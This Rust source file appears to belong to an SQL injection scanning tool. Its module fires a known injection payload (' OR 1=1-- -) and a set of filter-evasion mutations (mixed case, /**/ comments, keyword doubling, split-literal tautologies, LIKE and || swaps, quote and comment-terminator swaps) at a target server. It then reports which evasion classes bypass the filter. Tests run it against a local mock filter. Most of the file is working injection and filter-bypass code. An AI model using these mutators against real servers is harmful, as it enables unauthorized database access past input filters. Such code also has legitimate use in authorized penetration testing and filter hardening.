//! Filter-fingerprinting mutators (engine-agnostic). Ship class-tagged
//! transforms of a canonical keyword and report the classes that confirm
//! under "appears to allow: ...".
//!
//! Classes (per spec):
//!   MixedCase, InlineComments, AltWhitespace, KeywordDoubling, ConcatSplit,
//!   OperatorSwap, BooleanKeywordSwap, CommentTerminatorSwap, QuoteCharSwap,
//!   NoQuoteNumeric.
//!
//! OWNER (Phase 1): time+fingerprint agent.

use anyhow::Result;

use crate::common::Framing;
use crate::net::{attempt, connect_and_sync, Conn};
use crate::oracle::normalise;

use super::types::{Allows, Baseline, SqliConfig};

/// Given a known-vulnerable wrapper (e.g. `' OR 1=1-- -`), fire a tagged set
/// of mutator variants and return the classes that confirm. A class counts
/// when the mutant's reply diverges from both the baseline shape and the
/// plain-form reply — i.e. the mutation itself changed what the server did.
pub async fn run(
    conn: &mut Conn,
    framing: &Framing,
    timeout_secs: u64,
    _cfg: &SqliConfig,
    baseline: &Baseline,
    known_good_wrapper: &str,
) -> Result<Vec<Allows>> {
    // shortcut: fire-and-shape-diff heuristic; upgrade to per-class oracle when
    // operators report false positives on servers with always-constant replies

    let Some(plain_reply) = fire_retrying(conn, framing, timeout_secs, known_good_wrapper).await
    else {
        return Ok(Vec::new());
    };

    type Mutator = fn(&str) -> Option<String>;
    let classes: &[(Allows, Mutator)] = &[
        (Allows::MixedCase, mutate_mixed_case),
        (Allows::InlineComments, mutate_inline_comments),
        (Allows::AltWhitespace, mutate_alt_whitespace),
        (Allows::KeywordDoubling, mutate_keyword_doubling),
        (Allows::ConcatSplit, mutate_concat_split),
        (Allows::OperatorSwap, mutate_operator_swap),
        (Allows::BooleanKeywordSwap, mutate_bool_keyword_swap),
        (Allows::CommentTerminatorSwap, mutate_comment_terminator),
        (Allows::QuoteCharSwap, mutate_quote_swap),
        (Allows::NoQuoteNumeric, mutate_no_quote_numeric),
    ];

    let mut allowed = Vec::new();
    for (class, mutate) in classes {
        let Some(mutant) = mutate(known_good_wrapper) else {
            continue;
        };
        let Some(reply) = fire_retrying(conn, framing, timeout_secs, &mutant).await else {
            continue;
        };
        if reply != baseline.reply_shape && reply != plain_reply {
            allowed.push(*class);
        }
    }
    Ok(allowed)
}

async fn fire(
    conn: &mut Conn,
    framing: &Framing,
    timeout_secs: u64,
    payload: &str,
) -> Result<String> {
    let templated = framing.send_template.replace("FUZZ", payload);
    let raw = attempt(conn, framing, &templated, timeout_secs).await?;
    Ok(normalise(&raw, framing, &templated))
}

/// Fire once; on failure, reconnect in place and retry once. `None` when
/// either the reconnect or the retried fire also fails.
async fn fire_retrying(
    conn: &mut Conn,
    framing: &Framing,
    timeout_secs: u64,
    payload: &str,
) -> Option<String> {
    if let Ok(r) = fire(conn, framing, timeout_secs, payload).await {
        return Some(r);
    }
    if !reconnect_into(conn, framing, timeout_secs).await {
        return None;
    }
    fire(conn, framing, timeout_secs, payload).await.ok()
}

/// Reopen the socket to the same peer in place. Returns false on failure; the
/// caller then skips the class rather than propagating.
async fn reconnect_into(conn: &mut Conn, framing: &Framing, timeout_secs: u64) -> bool {
    let peer = match conn.1.peer_addr() {
        Ok(a) => a,
        Err(_) => return false,
    };
    match connect_and_sync(&peer.ip().to_string(), peer.port(), timeout_secs, framing).await {
        Ok(new) => {
            *conn = new;
            true
        }
        Err(_) => false,
    }
}

// ---- mutators ---------------------------------------------------------------

fn mutate_mixed_case(s: &str) -> Option<String> {
    let mut out = String::with_capacity(s.len());
    let mut flip = false;
    let mut any = false;
    for c in s.chars() {
        if c.is_ascii_alphabetic() {
            let nc = if flip {
                c.to_ascii_uppercase()
            } else {
                c.to_ascii_lowercase()
            };
            flip = !flip;
            if nc != c {
                any = true;
            }
            out.push(nc);
        } else {
            flip = false;
            out.push(c);
        }
    }
    any.then_some(out)
}

fn mutate_inline_comments(s: &str) -> Option<String> {
    s.contains(' ').then(|| s.replace(' ', "/**/"))
}

fn mutate_alt_whitespace(s: &str) -> Option<String> {
    s.contains(' ').then(|| s.replacen(' ', "\t", 1))
}

/// OR -> OORR, AND -> ANANDD, UNION -> UNUNIONION, SELECT -> SELSELECTECT.
fn mutate_keyword_doubling(s: &str) -> Option<String> {
    const KEYWORDS: &[&str] = &["UNION", "SELECT", "AND", "OR"];
    let upper = s.to_ascii_uppercase();
    for kw in KEYWORDS {
        if let Some(ix) = upper.find(kw) {
            let original = &s[ix..ix + kw.len()];
            let half = kw.len() / 2;
            let (a, b) = original.split_at(half);
            let doubled = format!("{a}{original}{b}");
            let mut out = String::with_capacity(s.len() + original.len());
            out.push_str(&s[..ix]);
            out.push_str(&doubled);
            out.push_str(&s[ix + kw.len()..]);
            return Some(out);
        }
    }
    None
}

/// `1=1` -> `'a'||'a'='aa'` (split-literal tautology).
fn mutate_concat_split(s: &str) -> Option<String> {
    s.contains("1=1").then(|| s.replace("1=1", "'a'||'a'='aa'"))
}

fn mutate_operator_swap(s: &str) -> Option<String> {
    if s.contains("1=1") {
        return Some(s.replace("1=1", "1 LIKE 1"));
    }
    if s.contains('=') {
        return Some(s.replacen('=', " LIKE ", 1));
    }
    None
}

fn mutate_bool_keyword_swap(s: &str) -> Option<String> {
    const SWAPS: &[(&str, &str)] = &[(" OR ", " || "), (" AND ", " && ")];
    let upper = s.to_ascii_uppercase();
    SWAPS.iter().find_map(|(from, to)| {
        let ix = upper.find(from)?;
        Some(format!("{}{to}{}", &s[..ix], &s[ix + from.len()..]))
    })
}

fn mutate_comment_terminator(s: &str) -> Option<String> {
    if let Some(rest) = s.strip_suffix("-- -") {
        return Some(format!("{rest}#"));
    }
    if let Some(rest) = s.strip_suffix("--") {
        return Some(format!("{rest}#"));
    }
    if let Some(rest) = s.strip_suffix('#') {
        return Some(format!("{rest}/*"));
    }
    None
}

fn mutate_quote_swap(s: &str) -> Option<String> {
    s.contains('\'').then(|| s.replace('\'', "\""))
}

fn mutate_no_quote_numeric(s: &str) -> Option<String> {
    s.strip_prefix('\'')
        .or_else(|| s.strip_prefix('"'))
        .map(str::to_string)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::common::{BannerSync, Framing};
    use std::time::Duration;
    use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
    use tokio::net::TcpListener;

    #[test]
    fn mixed_case_toggles_letters_only() {
        let m = mutate_mixed_case("' OR 1=1-- -").unwrap();
        assert_eq!(m, "' oR 1=1-- -");
    }

    #[test]
    fn keyword_doubling_or_becomes_oorr() {
        let m = mutate_keyword_doubling("' OR 1=1-- -").unwrap();
        assert_eq!(m, "' OORR 1=1-- -");
    }

    #[test]
    fn comment_terminator_swaps_tail() {
        let m = mutate_comment_terminator("' OR 1=1-- -").unwrap();
        assert_eq!(m, "' OR 1=1#");
    }

    #[test]
    fn no_quote_numeric_drops_leading_quote() {
        let m = mutate_no_quote_numeric("' OR 1=1-- -").unwrap();
        assert_eq!(m, " OR 1=1-- -");
    }

    /// Server blocks any line containing `SELECT` or `OR` (returns `blocked`),
    /// but returns `rows:xxx` for `SeLeCt` or `oR` — only MixedCase bypasses.
    async fn spawn_case_filter_oracle() -> std::net::SocketAddr {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            loop {
                let (sock, _) = match listener.accept().await {
                    Ok(x) => x,
                    Err(_) => return,
                };
                tokio::spawn(async move {
                    let (r, mut w) = sock.into_split();
                    let mut r = BufReader::new(r);
                    loop {
                        let mut line = String::new();
                        let n = match r.read_line(&mut line).await {
                            Ok(n) => n,
                            Err(_) => return,
                        };
                        if n == 0 {
                            return;
                        }
                        let body = line.trim_end_matches(['\r', '\n']);
                        // Case-sensitive filter: the exact uppercase token.
                        let blocked = body.contains("SELECT") || body.contains("OR");
                        let reply: &[u8] = if blocked { b"blocked\n" } else { b"rows:xxx\n" };
                        if w.write_all(reply).await.is_err() {
                            return;
                        }
                    }
                });
            }
        });
        addr
    }

    fn framing_bare() -> Framing {
        Framing {
            send_template: "FUZZ".into(),
            eol: "\n".into(),
            prompt: None,
            banner: BannerSync::SkipLines(0),
        }
    }

    #[tokio::test]
    async fn run_reports_mixed_case_against_case_filter() {
        let addr = spawn_case_filter_oracle().await;
        let framing = framing_bare();
        let mut conn = connect_and_sync(&addr.ip().to_string(), addr.port(), 5, &framing)
            .await
            .unwrap();
        let baseline = Baseline {
            reply_shape: "blocked".into(),
            rtt_mean: Duration::from_millis(10),
            rtt_stddev: Duration::from_millis(0),
            samples: 3,
        };
        let cfg = SqliConfig {
            sleep_secs: 1,
            confirm: 1,
        };
        let allowed = run(&mut conn, &framing, 5, &cfg, &baseline, "' OR 1=1-- -")
            .await
            .unwrap();
        assert!(
            allowed.contains(&Allows::MixedCase),
            "expected MixedCase in allowed set, got {allowed:?}",
        );
    }
}
